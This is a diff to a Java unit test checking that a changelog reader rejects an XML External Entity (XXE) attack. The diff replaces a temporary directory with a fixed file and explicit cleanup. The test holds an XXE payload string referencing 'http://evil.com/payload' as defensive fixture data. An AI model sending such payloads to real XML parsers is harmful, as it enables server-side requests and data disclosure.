@@ -128,12 +128,12 @@ public class AbstractSnapshotTunerTest {
 	// and attempting an XXE attack in a test environment is not recommended. 
 	// It could potentially expose the system to real attacks, even if unintentional.
 	@Test
-	public void testReadChangeLogFile_shouldThrowDocumentExceptionIncaseOfAnXxeAttack(@TempDir Path tempDir) throws Exception {
+	public void testReadChangeLogFile_shouldThrowDocumentExceptionIncaseOfAnXxeAttack() throws Exception {
 		String xmlContent = "<!DOCTYPE root [<!ENTITY ext SYSTEM \"http://evil.com/payload\">]><root>&ext;</root>";
-		Path tempFilePath = tempDir.resolve("test.xml");
+		Path tempFilePath = Paths.get("test.xml");
 		Files.write(tempFilePath, xmlContent.getBytes());
 		
 		assertThrows(DocumentException.class, () -> AbstractSnapshotTuner.readChangeLogFile(String.valueOf(tempFilePath)));
-		// No need to manually delete - @TempDir handles cleanup automatically
+		assertTrue(Files.deleteIfExists(tempFilePath)); //ensure the xml file is deleted after the assertion
 	}
 }
